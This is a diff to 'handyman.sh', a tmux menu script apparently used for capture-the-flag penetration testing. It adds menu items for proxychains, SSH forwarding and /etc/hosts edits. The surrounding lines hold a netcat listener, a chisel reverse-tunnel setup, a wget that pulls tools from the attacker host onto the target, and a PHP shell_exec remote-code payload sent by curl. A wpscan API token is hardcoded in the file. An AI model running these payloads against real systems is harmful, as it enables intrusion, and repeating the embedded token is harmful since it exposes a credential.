@@ -23,9 +23,12 @@ CTF_HOST=
 
 EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml
 
-COMMAND_2='Serve tools'
-COMMAND_3='Upload handyman'
-COMMAND_4="Remove entry from /etc/hosts"
+COMMAND_2='Serve this directory'
+COMMAND_3='Serve tools'
+COMMAND_4='Upload handyman'
+COMMAND_5="Add entry to /etc/hosts"
+COMMAND_6="Remove entry from /etc/hosts"
+COMMAND_7="Setup proxychains config"
 
 COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight "^\d+\/tcp"'
 COMMAND_e2='nmap -Pn -sV -oN nmap-vuln.txt --script vuln $RHOST | highlight "CVE-\d*-\d*"'
@@ -34,9 +37,10 @@ COMMAND_e4='whatweb -v $RHOST'
 COMMAND_e5='wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://$RHOST'
 
 COMMAND_n1='nc -nlvp 4444'
-COMMAND_n2='ssh $USER@$RHOST -p 22'
-COMMAND_n3='chisel server -p 9999 --reverse -v'
-COMMAND_n4='ssh -i id_rsa USER@$RHOST -D 9050 -N -f'
+COMMAND_n2='ssh -i id_rsa $USER@$RHOST -p 22'
+COMMAND_n3='ssh -i id_rsa $USER@$RHOST -L $RPORT:172.16.0.0:$LPORT -N -f'
+COMMAND_n4='ssh -i id_rsa $USER@$RHOST -D 9050 -N -f'
+COMMAND_n5='chisel server -p 9999 --reverse -v'
 
 COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
 COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'
@@ -69,10 +73,13 @@ CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
 CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"
 CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://$RHOST/index.php?page=php://input%00\" -k -v"
 
+LOCAL_="${ORANGE}$(whoami)@$LHOST${NOCOLOR}"
+REMOTE_="${RED}$USER@$RHOST${NOCOLOR}"
+
 show_menus() {
   clear
   echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-  echo -e "                 ${ORANGE}$LHOST${NOCOLOR} - Handyman - ${RED}$RHOST${NOCOLOR}"
+  echo -e "                 $LOCAL_ - Handyman - $REMOTE_"
   echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
   echo -e "  ${LIGHTGREEN}Setup${NOCOLOR}"
   echo -e "  ------"
@@ -80,6 +87,9 @@ show_menus() {
   echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
   echo -e "  ${YELLOW}3${NOCOLOR}) $COMMAND_3"
   echo -e "  ${YELLOW}4${NOCOLOR}) $COMMAND_4"
+  echo -e "  ${YELLOW}5${NOCOLOR}) $COMMAND_5"
+  echo -e "  ${YELLOW}6${NOCOLOR}) $COMMAND_6"
+  echo -e "  ${YELLOW}7${NOCOLOR}) $COMMAND_7"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
   echo -e "  -------------"
@@ -95,6 +105,7 @@ show_menus() {
   echo -e "  ${YELLOW}n2${NOCOLOR}) $COMMAND_n2"
   echo -e "  ${YELLOW}n3${NOCOLOR}) $COMMAND_n3"
   echo -e "  ${YELLOW}n4${NOCOLOR}) $COMMAND_n4"
+  echo -e "  ${YELLOW}n5${NOCOLOR}) $COMMAND_n5"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
   echo -e "  ------"
@@ -147,6 +158,8 @@ show_menus() {
 setTmuxEnv () {
   tmux setenv LHOST $LHOST
   tmux setenv RHOST $RHOST
+  tmux setenv LPORT $PORTT
+  tmux setenv RPORT $RPORT
   tmux setenv USER $USER
   tmux setenv CTF_HOST $CTF_HOST
 }
@@ -186,6 +199,15 @@ exportLHOST() {
   fi
 }
 
+serveIt() {
+  # Serve the folder
+  if [ ! command -v python3 &> /dev/null ]; then
+    tmux send-keys "python -m SimpleHTTPServer" ENTER
+  else
+    tmux send-keys "python3 -m http.server" ENTER
+  fi
+}
+
 runServeTools() {
   openSplit
 
@@ -193,13 +215,14 @@ runServeTools() {
   tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
   tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
   tmux send-keys 'cd ~/Tools' 'C-m'
-  
-  # Serve the Tools/ folder
-  if [ ! command -v python3 &> /dev/null ]; then
-    tmux send-keys "python -m SimpleHTTPServer" ENTER
-  else
-    tmux send-keys "python3 -m http.server" ENTER
-  fi
+
+  serveIt
+}
+
+runServeHere() {
+  openSplit
+
+  serveIt
 }
 
 runUploadHandyman() {
@@ -242,16 +265,41 @@ runC() {
 }
 
 addEtcHosts() {
-  export CTF_HOST=$1
+  if [ -z $1 ]; then
+    CLIPBOARD=$(xclip -o)
 
-  sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"
+    if [[ $CLIPBOARD =~ ^\S*\.\S*$ ]]; then
+      export CTF_HOST=$CLIPBOARD
 
-  xdg-open "http://$CTF_HOST"
+      sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"
+
+      xdg-open "http://$CTF_HOST"
+    else
+      openSplit
+
+      tmux send-keys "sudo vim /etc/hosts"
+    fi
+  else
+    export CTF_HOST=$1
+
+    sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"
+
+    xdg-open "http://$CTF_HOST"
+  fi
 }
 
 removeEtcHosts() {
   # Remove the entry from /etc/hosts
   sudo bash -c "sed -i '/$RHOST/d' /etc/hosts"
+}
+
+setupProxyChains() {
+  openSplit
+
+  tmux send-keys "cp /etc/proxychains.conf ." ENTER
+  sleep 0.1
+
+  tmux send-keys "vim ./proxychains.conf" ENTER
 }
 
 runExit() {
@@ -265,9 +313,12 @@ read_options() {
     1) exportRHOST 1;;
     R) exportRHOST 1;;
 
-    2) runServeTools;;
-    3) runUploadHandyman;;
-    4) removeEtcHosts;;
+    2) runServeHere;;
+    3) runServeTools;;
+    4) runUploadHandyman;;
+    5) addEtcHosts;;
+    6) removeEtcHosts;;
+    7) setupProxyChains;;
 
     e1) runV $COMMAND_e1;;
     e11) runCat 'e1';;
@@ -282,6 +333,7 @@ read_options() {
     n2) runV $COMMAND_n2;;
     n3) runV $COMMAND_n3;;
     n4) runV $COMMAND_n4;;
+    n5) runV $COMMAND_n5;;
 
     u1) runV $COMMAND_u1;;
     u2) runV $COMMAND_u2;;
